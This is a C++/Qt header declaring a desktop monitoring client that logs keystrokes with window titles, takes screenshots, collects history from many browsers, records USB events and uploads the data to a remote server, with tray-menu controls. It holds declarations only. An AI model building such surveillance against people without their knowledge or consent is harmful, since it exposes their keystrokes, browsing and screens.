#ifndef MONITORCLIENT_H
#define MONITORCLIENT_H

#include <QObject>
#include <QTimer>
#include <QElapsedTimer>
#include <functional>
#include <atomic>

#include <QPair>
#include <QNetworkAccessManager>
#include <QNetworkReply>
#include <QJsonArray>
#include <QJsonObject>
#include <QJsonDocument>
#include <QSqlDatabase>
#include <QSqlQuery>
#include <QSqlError>
#include <QDir>
#include <QFile>
#include <QTextStream>
#include <QStandardPaths>
#include <QStorageInfo>
#include <QSysInfo>
#include <QScreen>
#include <QGuiApplication>
#include <QDebug>
#include <QProcess>
#include <QDateTime>
#include <QTimeZone>
#include <QEventLoop>
#include <QStorageInfo>
#include <QNetworkInterface>
#include <QDBusInterface>
#include <QDBusReply>
#include <QDBusConnection>
#include <QSystemTrayIcon>
#include <QMenu>
#include <QAction>
#include <QList>
#include <QIcon>
#include <QPointer>
class ConfigDialog;
#include <libudev.h>
#include <qchar.h>

#include "KeyboardMonitor.h"
#include "ScreenCastPortal.h"

class MonitorClient : public QObject
{
    Q_OBJECT

public:
    MonitorClient();
    ~MonitorClient();

    /// Reopen Settings in the original process when the launcher is invoked again.
    void notifyRunningInstance();

public slots:
    int getScreen();
    int sendTic();
    int sendBrowserHistories();
    int sendKeyLogs();
    int sendUSBLogs();
    void handleKeyPress(QString timestamp, const QString &windowTitle, const QString &keyText);
    void handleUsbEvent();
    void enableScreenshot(bool enabled);
    void enableKeylog(bool enabled);
    void enableBrowserHistory(bool enabled);
    void enableUsbMonitoring(bool enabled);
    
    // System tray slots
    void onTrayIconActivated(QSystemTrayIcon::ActivationReason reason);
    void onSendAllAction();
    void onConfigureAction();
    void onTakeScreenshotAction();
    void onTestConnectionAction();
    void onTestAPIEndpointsAction();
    void onConfigRefreshAction();
    void notifyTray(const QString &title,const QString &message,QSystemTrayIcon::MessageIcon icon,int timeout);

private slots:
    void monitorTimerTick();

signals:
    void screen();
    void tic();
    void browserHistory();
    void keyLog();
    void usbLog();
    void usbEvent();

private:
    QString getMacAddress();
    QString getDeviceInfo(struct udev_device* dev);
    void processUsbEvent(struct udev_device* dev);
    void grabEntireDesktop(QString path, QPixmap& res, bool& ok);
    int captureScreen(bool manual);
    void uploadCapturedScreenshot(const QString &basePath);
    void reportScreenshotCaptureError(const QString &reason);
    void grabScreen(QString filePath, bool& ok);
    void sendScreensAsync(const QString &filePath, std::function<void(int)> onDone);
    void sendDataChunkAsync(const QString &serverIP, int serverPort,
                            const QString &eventType, const QString &dataField,
                            const QString &data, std::function<void(int)> onDone);
    void continueSendKeyLogs(int index, QList<QList<QJsonObject>> chunks);
    void continueSendUsbLogs(int index, QList<QList<QJsonObject>> chunks);
    void continueSendBrowserChunks(int index, QList<QList<QJsonObject>> chunks);
    void getStorageDevices();
    void setupUsbMonitoring();
    void cleanupUsbMonitoring();
    qint64 convertUnixtimestampToBrowserTime(const QString& browserName, const qint64 unixtimestamp);
    void updateLastCheckedTime(const QString& browserName, const qint64 timestamp);
    QList<QList<QJsonObject>> chunkData(const QList<QJsonObject>& data, int chunkSize);
    void queryBrowserHistory(const QString& dbPath, const QString& query, const QString& browserName);
    QStringList getMozBasedProfilePaths(const QString& browserPath);
    QStringList getChromiumBasedProfilePaths(const QString& browserPath);
    void getFirefoxHistory();
    void getChromeHistory();
    void getEdgeHistory();
    void getOperaHistory();
    void getBraveHistory();
    void getMidoriHistory();
    void getYandexHistory();
    void getSlimjetHistory();
    void getFalkonHistory();
    void getBrowserHistory();
    QString getJsonObjectListAsJsonString(const QList<QJsonObject>& jsonObjectList);
    qint64 getLastCheckedTime(const QString& browserName);
    QString getFieldNameForVisitTime(const QString& browserName);
    void getVivaldiHistory();
    bool isInterruptionRequested();
    int checkActiveScreen();
    
    // Configuration management
    void fetchConfigurationFromAPI(bool showTrayProgress = false);
    void uploadPendingBrowserHistories();
    void updateConfiguration(const QJsonObject& config);
    void manualConfigRefresh();
    
    // System tray methods
    void setupSystemTray();
    void cleanupSystemTray();
    void updateTrayIcon();
    void updateTrayMenu();
    void setTrayActivity(const QString &shortMessage);
    void clearTrayActivity();
    void showConnectionError(const QString& error);
    void scheduleConnectionTest(const QString &busyMessage = QString(),
                                std::function<void(bool)> onFinished = nullptr);
    QPair<bool, QString> evaluateRemoteServer();
    void updateStatusDisplay();
    QString formatLastSentTime(const QDateTime& time);
    QString getLocalIPAddress();
    bool testBasicConnectivity(const QString& host, int port);
    bool testAPIEndpoints(const QString& serverIP, int serverPort);

    QPointer<ConfigDialog> activeSettingsDialog;
    QString macAddress;
    QString authToken;
    int monitorId = 0;
    int screenInterval;
    int ticInterval;
    int historyInterval;
    int keyInterval;
    int usbInterval;
    int configRefreshInterval;
    int lastBrowserTic;
    KeyboardMonitor *keyboardMonitor;
    
    // Configuration management
    QJsonObject currentConfig;
    bool isConfigUpdating;
    QDateTime lastConfigUpdate;
    QTimer *configTimer;
    QTimer *monitorTimer;
    
    // USB monitoring
    struct udev *udev;
    struct udev_monitor *monitor;
    int udevFd;
    QMap<QString, QString> usbDeviceInfo;
    
    // Storage monitoring
    QList<QStorageInfo> storageDevices;
    
    // Data storage
    QList<QJsonObject> keyLogs;
    QList<QJsonObject> usbLogs;
    QList<QJsonObject> browserHistories;
    QMap<QString, qint64> lastCheckedTimes;
    
    // Network manager
    QNetworkAccessManager *networkManager;
    
    // System tray
    QSystemTrayIcon *trayIcon = nullptr;
    QMenu *trayMenu = nullptr;
    /// Status lines inserted above `screenshotAction` (parent `trayMenu`; cleared on each update).
    QList<QAction *> trayStatusDynamicActions;
    QAction *sendAllAction;
    QAction *configureAction;
    QAction *screenshotAction;
    bool serverConnected = false;
    QString lastError;
    QString screenshotUploadError;
    QString clientName;
    QString signedUserNo;
    QString keyboardReaderStatus = QStringLiteral("Not started");

    // Status tracking
    bool screenshotEnabled = true;
    bool keylogEnabled = true;
    bool browserHistoryEnabled = true;
    bool usbMonitoringEnabled = true;
    bool screenshotInProgress = false;
    bool m_screenshotUploadStarted = false;
    // Monotonic cooldown prevents duplicate scheduled/manual captures in a burst.
    QElapsedTimer m_captureCooldown;
    QDateTime m_captureTimeUtc;
    QString m_lastCaptureError;
    
    // Last sent times
    QDateTime lastKeySentTime;
    QDateTime lastUsbSentTime;
    QDateTime lastBrowserSentTime;
    QDateTime lastScreenshotSentTime;
    QDateTime lastTicSentTime;
    
    // Connection error tracking
    bool connectionErrorNotified;
    
    // Database
    QSqlDatabase db;

    // Wayland screen capture via xdg-desktop-portal + PipeWire
    ScreenCastPortal *screenCastPortal;

    QString m_trayActivity;

    qint64 m_lastEmitTicTime;
    qint64 m_lastEmitHistoryTime;
    qint64 m_lastEmitScreenshotTime;
    qint64 m_lastEmitKeyLogTime;
    qint64 m_lastEmitUsbLogTime;

    std::atomic<bool> m_browserHistoryBusy;
    bool m_keyUploadBusy = false;
    bool m_usbUploadBusy = false;
};

#endif // MONITORCLIENT_H
